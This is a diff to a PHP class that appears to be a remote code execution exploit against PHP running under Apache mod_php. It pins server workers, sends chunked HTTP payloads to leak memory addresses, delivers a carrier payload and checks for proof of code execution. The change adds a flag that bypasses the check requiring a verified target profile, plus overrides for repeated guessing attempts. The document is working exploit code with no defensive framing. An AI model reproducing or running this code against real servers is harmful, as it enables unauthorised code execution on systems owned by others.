@@ -22,24 +22,35 @@ final class Php2ShellPoc
     ) {
     }
 
-    public function stage1(Target $target, Profile $profile): PocResult
+    public function stage1(Target $target, Profile $profile, ?int $workers = null, ?int $timeout = null): PocResult
     {
-        return $this->execute($target, $profile, false);
+        return $this->execute($target, $profile, false, false, $workers, $timeout);
     }
 
-    public function run(Target $target, Profile $profile): PocResult
-    {
-        return $this->execute($target, $profile, true);
+    public function run(
+        Target $target,
+        Profile $profile,
+        bool $allowUnverified = false,
+        ?int $workers = null,
+        ?int $timeout = null,
+    ): PocResult {
+        return $this->execute($target, $profile, true, $allowUnverified, $workers, $timeout);
     }
 
-    private function execute(Target $target, Profile $profile, bool $full): PocResult
-    {
-        if (!$profile->rceVerified()) {
+    private function execute(
+        Target $target,
+        Profile $profile,
+        bool $full,
+        bool $allowUnverified,
+        ?int $workersOverride,
+        ?int $timeoutOverride,
+    ): PocResult {
+        if (!$profile->rceVerified() && !$allowUnverified) {
             return new PocResult(false, 'profile is not verified');
         }
 
         if (strtolower($profile->sapi()) !== 'apache2handler') {
-            return new PocResult(false, 'the verified chain is mod_php only');
+            return new PocResult(false, 'the verified chain is mod_php only', terminal: true);
         }
 
         $parts = parse_url($target->url);
@@ -47,17 +58,20 @@ final class Php2ShellPoc
         $host = (string) ($parts['host'] ?? '');
 
         if (!in_array($scheme, ['http', 'https'], true) || $host === '') {
-            return new PocResult(false, 'target URL is not a supported HTTP URL');
+            return new PocResult(false, 'target URL is not a supported HTTP URL', terminal: true);
         }
 
         if ($full && $this->client === null) {
-            return new PocResult(false, 'proof client is not configured');
+            return new PocResult(false, 'proof client is not configured', terminal: true);
         }
 
-        $workers = max(1, $profile->workers());
+        $workers = max(1, $workersOverride ?? $profile->workers());
+        // A guess pass can shorten an attempt, but never exceed the configured
+        // per-attempt timeout.
+        $timeout = max(1, min($timeoutOverride ?? $this->timeout, $this->timeout));
 
         if ($workers > $this->maxWorkers) {
-            return new PocResult(false, sprintf('worker cap exceeded (%d > %d)', $workers, $this->maxWorkers));
+            return new PocResult(false, sprintf('worker cap exceeded (%d > %d)', $workers, $this->maxWorkers), terminal: true);
         }
 
         if ($workers > 1 && function_exists('posix_getrlimit')) {
@@ -65,11 +79,11 @@ final class Php2ShellPoc
             $soft = $limits['openfiles_soft'] ?? null;
 
             if (is_numeric($soft) && (int) $soft > 0 && $workers + 20 > (int) $soft) {
-                return new PocResult(false, sprintf('local file-descriptor budget is too small for %d holders', $workers - 1));
+                return new PocResult(false, sprintf('local file-descriptor budget is too small for %d holders', $workers - 1), terminal: true);
             }
         }
 
-        $deadline = microtime(true) + max(1, $this->timeout);
+        $deadline = microtime(true) + $timeout;
         $port = (int) ($parts['port'] ?? ($scheme === 'https' ? 443 : 80));
         $path = $target->postPath ?? (string) ($parts['path'] ?? '/');
         $path = $path !== '' ? $path : '/';
@@ -125,7 +139,7 @@ final class Php2ShellPoc
             }
 
             if (!$free) {
-                return new PocResult(false, 'proof paths are not free');
+                return new PocResult(false, 'proof paths are not free', terminal: true);
             }
         }
 
@@ -136,7 +150,7 @@ final class Php2ShellPoc
         $b2 = null;
 
         try {
-            $raw = new RawHttp($scheme, $host, $port, (float) $this->timeout, $target->requestHeaders());
+            $raw = new RawHttp($scheme, $host, $port, (float) $timeout, $target->requestHeaders());
             $holders = 0;
 
             if ($workers > 1) {
@@ -151,14 +165,14 @@ final class Php2ShellPoc
                 }
 
                 if ($holders < $workers - 1) {
-                    return new PocResult(false, sprintf('worker pinning failed (%d/%d holders)', $holders, $workers - 1));
+                    return new PocResult(false, sprintf('worker pinning failed (%d/%d holders)', $holders, $workers - 1), terminal: true);
                 }
 
                 usleep(800_000);
             }
 
             if (microtime(true) > $deadline) {
-                return new PocResult(false, 'PoC deadline exceeded before stage 1');
+                return new PocResult(false, 'PoC deadline exceeded before stage 1', terminal: true);
             }
 
             $builder = $this->builder ?? new PayloadBuilder();
@@ -166,7 +180,7 @@ final class Php2ShellPoc
             $b1 = tempnam(sys_get_temp_dir(), 'p2s-b1-');
 
             if ($a1 === false || $b1 === false) {
-                return new PocResult(false, 'cannot create the stage-1 payload files');
+                return new PocResult(false, 'cannot create the stage-1 payload files', terminal: true);
             }
 
             $builder->a1($a1, $a1Big);
@@ -176,13 +190,20 @@ final class Php2ShellPoc
             usleep(200_000);
 
             if (microtime(true) > $deadline) {
-                return new PocResult(false, 'PoC deadline exceeded before the leak request');
+                return new PocResult(false, 'PoC deadline exceeded before the leak request', terminal: true);
             }
 
             $builder->b1($b1, $b1FakeLen, true, $b1Spec);
             $response = $raw->sendChunked($path, $b1);
 
-            $leak = LeakParser::parse($response, $zvalOffset, $mainBucketCount);
+            try {
+                $leak = LeakParser::parse($response, $zvalOffset, $mainBucketCount);
+            } catch (\RuntimeException $e) {
+                // A profile that does not match this build normally fails to
+                // leak; that is a failed guess, not a target failure.
+                return new PocResult(false, 'stage 1 leak parse failed: ' . $e->getMessage());
+            }
+
             $main = $leak['main_candidates'][0] ?? null;
 
             if ($main === null) {
@@ -222,11 +243,11 @@ final class Php2ShellPoc
             $b2 = tempnam(sys_get_temp_dir(), 'p2s-b2-');
 
             if ($a2 === false || $b2 === false) {
-                return new PocResult(false, 'cannot create the stage-3 payload files');
+                return new PocResult(false, 'cannot create the stage-3 payload files', terminal: true);
             }
 
             if (microtime(true) > $deadline) {
-                return new PocResult(false, 'PoC deadline exceeded before stage 3');
+                return new PocResult(false, 'PoC deadline exceeded before stage 3', terminal: true);
             }
 
             $builder->a2($a2, $a2Parts, $a2Depth, $a2Fillers);
@@ -234,7 +255,7 @@ final class Php2ShellPoc
             usleep(200_000);
 
             if (microtime(true) > $deadline) {
-                return new PocResult(false, 'PoC deadline exceeded before the carrier request');
+                return new PocResult(false, 'PoC deadline exceeded before the carrier request', terminal: true);
             }
 
             $builder->b2($b2, $carrier, $s, $b2Vl, $b2N1, $b2N2);
@@ -278,9 +299,10 @@ final class Php2ShellPoc
                 confirmed: false,
                 reason: 'RCE proof not retrievable from the candidate paths',
                 evidence: json_encode($evidenceBase, JSON_THROW_ON_ERROR),
+                terminal: true,
             );
         } catch (\Throwable $e) {
-            return new PocResult(false, ($full ? 'stage 3' : 'stage 1') . ' failed: ' . $e->getMessage());
+            return new PocResult(false, ($full ? 'stage 3' : 'stage 1') . ' failed: ' . $e->getMessage(), terminal: true);
         } finally {
             if ($raw !== null) {
                 $raw->close();
